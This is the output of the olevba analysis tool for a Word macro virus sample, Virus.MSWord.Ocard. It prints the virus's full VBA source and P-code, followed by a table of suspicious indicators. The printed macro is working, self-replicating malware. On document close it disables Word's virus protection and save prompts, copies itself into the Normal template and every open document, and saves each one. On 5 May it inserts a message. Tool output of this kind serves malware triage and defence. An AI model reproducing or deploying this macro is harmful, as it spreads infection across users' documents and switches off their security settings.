olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ocard
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ocard - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Draco Malfoy
Dim a As Document, t As Template
Dim beak As Double, str As String
Dim i, salmon As Integer
On Error Resume Next
Set a = ActiveDocument
Set t = NormalTemplate
'Coups -39
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
If Left(a.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 6) = "'Draco" Then
    salmon = vbOK
End If
If Left(t.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 6) = "'Draco" Then
    salmon = salmon + vbCritical
End If
Select Case salmon
    Case vbOK
    str = a.VBProject.VBComponents.Item(1).CodeModule.Lines(1, a.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    With t.VBProject.VBComponents.Item(1).CodeModule
        .DeleteLines 1, .CountOfLines
        .AddFromString str
        beak = Val(Mid(.Lines(9, 1), 7, Len(.Lines(9, 1)))) + 1
        .ReplaceLine 9, "'Coups " & beak
        If beak Mod 2 Then
            .ReplaceLine 1, Left(.Lines(1, 1), 21) & "Close()"
        Else
            .ReplaceLine 1, Left(.Lines(1, 1), 21) & "Open()"
        End If
    End With
    Case vbCritical
    str = t.VBProject.VBComponents.Item(1).CodeModule.Lines(1, t.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    With a.VBProject.VBComponents.Item(1).CodeModule
        .DeleteLines 1, .CountOfLines
        .AddFromString str
    End With
    Case vbByte
    str = a.VBProject.VBComponents.Item(1).CodeModule.Lines(1, a.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    For i = 1 To Word.Windows.Count
        With Word.Windows.Item(i).Document.VBProject.VBComponents.Item(1).CodeModule
            If Left(.Lines(2, 1), 6) <> "'Draco" Then
                .DeleteLines 1, .CountOfLines
                .AddFromString str
            End If
        End With
        Word.Windows.Item(i).Document.Save
    Next i
End Select
If Month(Now) = 5 And Day(Now) = 5 Then
    If Right(a.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1), 7) = "Close()" Then
        Selection.TypeText "Is it not a Camel ? "
        a.Save
    End If
End If
End Sub





-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ocard
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4154 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x000C "Draco Malfoy"
' Line #2:
' 	Dim 
' 	VarDefn a (As Document)
' 	VarDefn t (As Template)
' Line #3:
' 	Dim 
' 	VarDefn beak (As Double)
' 	VarDefn str (As String)
' Line #4:
' 	Dim 
' 	VarDefn i
' 	VarDefn salmon (As Integer)
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set a 
' Line #7:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set t 
' Line #8:
' 	QuoteRem 0x0000 0x0009 "Coups -39"
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #12:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0006 "'Draco"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	Ld vbOK 
' 	St salmon 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0006 "'Draco"
' 	Eq 
' 	IfBlock 
' Line #16:
' 	Ld salmon 
' 	Ld vbCritical 
' 	Add 
' 	St salmon 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld salmon 
' 	SelectCase 
' Line #19:
' 	Ld vbOK 
' 	Case 
' 	CaseDone 
' Line #20:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St str 
' Line #21:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #22:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #23:
' 	Ld str 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #24:
' 	LitDI2 0x0009 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0007 
' 	LitDI2 0x0009 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St beak 
' Line #25:
' 	LitDI2 0x0009 
' 	LitStr 0x0007 "'Coups "
' 	Ld beak 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #26:
' 	Ld beak 
' 	LitDI2 0x0002 
' 	Mod 
' 	IfBlock 
' Line #27:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0015 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "Close()"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #28:
' 	ElseBlock 
' Line #29:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0015 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0006 "Open()"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndWith 
' Line #32:
' 	Ld vbCritical 
' 	Case 
' 	CaseDone 
' Line #33:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St str 
' Line #34:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #35:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #36:
' 	Ld str 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #37:
' 	EndWith 
' Line #38:
' 	Ld vbByte 
' 	Case 
' 	CaseDone 
' Line #39:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St str 
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Word 
' 	MemLd Windows 
' 	MemLd Count 
' 	For 
' Line #41:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Word 
' 	MemLd Windows 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Document 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #42:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0006 "'Draco"
' 	Ne 
' 	IfBlock 
' Line #43:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #44:
' 	Ld str 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	EndWith 
' Line #47:
' 	Ld i 
' 	Ld Word 
' 	MemLd Windows 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Document 
' 	ArgsMemCall Save 0x0000 
' Line #48:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	EndSelect 
' Line #50:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #51:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0007 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0007 "Close()"
' 	Eq 
' 	IfBlock 
' Line #52:
' 	LitStr 0x0014 "Is it not a Camel ? "
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #53:
' 	Ld a 
' 	ArgsMemCall Save 0x0000 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

